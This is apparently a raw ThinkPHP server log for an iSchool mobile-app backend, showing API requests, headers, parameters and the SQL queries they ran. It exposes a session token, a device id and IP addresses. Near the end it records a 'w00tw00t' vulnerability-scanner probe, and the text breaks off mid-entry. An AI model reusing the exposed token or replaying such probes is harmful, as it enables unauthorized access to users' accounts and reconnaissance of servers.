[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.006847s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.002891s ]
[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 34 LIMIT 1 [ RunTime:0.012035s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_serve` [ RunTime:0.000639s ]
[ sql ] [ SQL ] SELECT sst.id type_id,st.type_name p_name,ss.plays_id serve_id,`event_title`,`sst`.`type_name`,`u`.`head_image`,`u`.`nickname`,`us`.`grade`,`ss`.`user_id`,`ss`.`launch`,`ss`.`charging`,`ss`.`funds`,`ss`.`images` FROM `s_serve` `ss` LEFT JOIN `s_sociality_type` `sst` ON `ss`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `ss`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  `st`.`pid` = 1  AND (   u.school=1 )  AND `end_times` > 1549608272  AND `ss`.`status` = 1 ORDER BY `ss`.`launch` DESC LIMIT 0,10 [ RunTime:0.002157s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:32+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/getModule
[运行时间：0.033355s] [吞吐率：29.98req/s] [内存消耗：2,611.82kb] [文件加载：53]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'getModule',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->getModule[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000325s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000621s ]
[ sql ] [ SQL ] SELECT type_name s_type_name,id pid,`icon` FROM `sociality_type` WHERE  `pid` = 0 [ RunTime:0.000262s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000475s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '11' LIMIT 1 [ RunTime:0.000332s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '5' LIMIT 1 [ RunTime:0.000246s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '6' LIMIT 1 [ RunTime:0.000295s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:34+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/serveObtain
[运行时间：0.068874s] [吞吐率：14.52req/s] [内存消耗：2,631.72kb] [文件加载：54]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'serveObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->serveObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.010286s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.001610s ]
[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 34 LIMIT 1 [ RunTime:0.000962s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_serve` [ RunTime:0.001744s ]
[ sql ] [ SQL ] SELECT sst.id type_id,st.type_name p_name,ss.plays_id serve_id,`event_title`,`sst`.`type_name`,`u`.`head_image`,`u`.`nickname`,`us`.`grade`,`ss`.`user_id`,`ss`.`launch`,`ss`.`charging`,`ss`.`funds`,`ss`.`images` FROM `s_serve` `ss` LEFT JOIN `s_sociality_type` `sst` ON `ss`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `ss`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  `st`.`pid` = 1  AND (   u.school=1 )  AND `end_times` > 1549608274  AND `ss`.`status` = 1 ORDER BY `ss`.`launch` DESC LIMIT 0,10 [ RunTime:0.000942s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:34+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/playsObtain
[运行时间：0.072457s] [吞吐率：13.80req/s] [内存消耗：2,650.24kb] [文件加载：54]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'playsObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->playsObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.018136s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.001562s ]
[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 34 LIMIT 1 [ RunTime:0.001048s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.001050s ]
[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name` FROM `sociality_type` `st` WHERE  `pid` = 2 [ RunTime:0.000255s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000911s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 6 [ RunTime:0.000617s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 7 [ RunTime:0.001444s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 8 [ RunTime:0.000247s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 9 [ RunTime:0.000199s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `plays` [ RunTime:0.011574s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 9,11 ) and u.school=1 )  AND `p_start` > 1549608274  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000566s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 6 ) and u.school=1 )  AND `p_start` > 1549608274  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000460s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 7 ) and u.school=1 )  AND `p_start` > 1549608274  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000471s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 8 ) and u.school=1 )  AND `p_start` > 1549608274  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000424s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:34+08:00 ] 117.136.30.12 POST 148.70.73.177/api/banner/showBanner
[运行时间：0.064979s] [吞吐率：15.39req/s] [内存消耗：2,737.19kb] [文件加载：55]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'banner',
    2 => 'showBanner',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '131',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'number' => '-1',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type' => '2',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.025465s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.000614s ]
[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 2  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000260s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:34+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/getModule
[运行时间：0.031641s] [吞吐率：31.60req/s] [内存消耗：2,611.82kb] [文件加载：53]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'getModule',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->getModule[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000365s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000650s ]
[ sql ] [ SQL ] SELECT type_name s_type_name,id pid,`icon` FROM `sociality_type` WHERE  `pid` = 0 [ RunTime:0.000269s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000479s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '11' LIMIT 1 [ RunTime:0.000268s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '5' LIMIT 1 [ RunTime:0.000254s ]
[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '6' LIMIT 1 [ RunTime:0.000244s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:36+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/obtainType
[运行时间：0.025720s] [吞吐率：38.88req/s] [内存消耗：2,610.23kb] [文件加载：53]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'obtainType',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '124',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type_id' => '1',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->obtainType[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000345s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000671s ]
[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name`,`icon` FROM `sociality_type` `st` WHERE  `st`.`pid` = '1'  AND `st`.`status` = 1 [ RunTime:0.000308s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000482s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 3 [ RunTime:0.000246s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 4 [ RunTime:0.000244s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 5 [ RunTime:0.000215s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:41+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/obtainType
[运行时间：0.032730s] [吞吐率：30.55req/s] [内存消耗：2,611.07kb] [文件加载：53]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'obtainType',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '124',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type_id' => '2',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->obtainType[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000423s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000763s ]
[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name`,`icon` FROM `sociality_type` `st` WHERE  `st`.`pid` = '2'  AND `st`.`status` = 1 [ RunTime:0.000430s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000663s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 6 [ RunTime:0.000326s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 7 [ RunTime:0.000282s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 8 [ RunTime:0.000284s ]
[ sql ] [ SQL ] SELECT `type_name`,id s_type_id,`icon` FROM `s_sociality_type` WHERE  `type_id` = 9 [ RunTime:0.000309s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:44+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/allPlaysAb
[运行时间：0.024773s] [吞吐率：40.37req/s] [内存消耗：2,631.43kb] [文件加载：54]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'allPlaysAb',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '132',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'pages' => '1',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type_id' => '6',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->allPlaysAb[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000422s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000808s ]
[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 34 LIMIT 1 [ RunTime:0.000271s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `plays` [ RunTime:0.000552s ]
[ sql ] [ SQL ] SELECT `p`.`event_title`,`p`.`plays_id`,`p`.`ask`,`p`.`funds`,`p`.`p_start`,`p`.`launch`,sst.id s_type_id,`sst`.`type_name`,`u`.`head_image`,`us`.`grade`,`u`.`sex`,`p`.`number`,`u`.`u_vip` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `sst`.`id`=`p`.`about_type_id` LEFT JOIN `sociality_type` `st` ON `sst`.`type_id`=`st`.`id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  `sst`.`type_id` = '6'  AND (   school=1 )  AND `p_start` > 1549608284  AND `p`.`status` = 1 ORDER BY `p`.`plays_id` DESC LIMIT 0,10 [ RunTime:0.000499s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:58+08:00 ] 196.52.43.98 GET /
[运行时间：0.011114s] [吞吐率：89.98req/s] [内存消耗：1,242.39kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T14:45:02+08:00 ] 117.136.30.12 POST 148.70.73.177/api/users/showinfo
[运行时间：0.041255s] [吞吐率：24.24req/s] [内存消耗：2,804.78kb] [文件加载：56]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'users',
    2 => 'showinfo',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Users->showInfo[ /data/web/php/ischool/application/api/controller/Users.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000342s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000789s ]
[ sql ] [ SQL ] SELECT `u`.`user_id`,`username`,`nickname`,`kjmessage_id`,s.sname school,`grade`,`u`.`sex`,`u`.`head_image`,`u`.`background_img`,`u`.`signature`,`user_birth` FROM `users` `u` LEFT JOIN `users_secretary` `us` ON `us`.`user_id`=`u`.`user_id` LEFT JOIN `school` `s` ON `u`.`school`=`s`.`id` WHERE  `u`.`user_id` = '34' LIMIT 1 [ RunTime:0.000388s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `follows` [ RunTime:0.000438s ]
[ sql ] [ SQL ] SELECT count(id) follows FROM `follows` WHERE  `f_user_id` = 34 LIMIT 1 [ RunTime:0.000251s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `comment_fabulous` [ RunTime:0.000427s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `comment_fabulous` `cf` LEFT JOIN `comment` `c` ON `cf`.`comment_id`=`c`.`id` LEFT JOIN `users` `u` ON `u`.`user_id`=`c`.`user_id` WHERE  `u`.`user_id` = '34'  AND `cf`.`status` = 1 LIMIT 1 [ RunTime:0.000354s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `activity_fabulous` [ RunTime:0.000459s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `activity_fabulous` WHERE  `release_id` = 34 LIMIT 1 [ RunTime:0.000233s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `medal` [ RunTime:0.000445s ]
[ sql ] [ SQL ] SELECT id medal_id,`medal_name`,`medal_icon` FROM `medal` WHERE  `user_id` = 34 [ RunTime:0.000201s ]
---------------------------------------------------------------
[ 2019-02-08T14:45:02+08:00 ] 117.136.30.12 GET 148.70.73.177/(null)
[运行时间：0.016111s] [吞吐率：62.07req/s] [内存消耗：1,368.19kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '(null)',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'iSchool/1 CFNetwork/976 Darwin/18.2.0',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-cn',
  'accept' => 'image/webp,image/*;q=0.8',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T15:52:00+08:00 ] 140.143.241.113 GET 148.70.73.177/w00tw00t.at.blackhats.romanian.anti-sec:)
[运行时间：0.014542s] [吞吐率：68.77req/s] [内存消耗：1,368.22kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'w00tw00t.at.blackhats.romanian.anti-sec:)',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
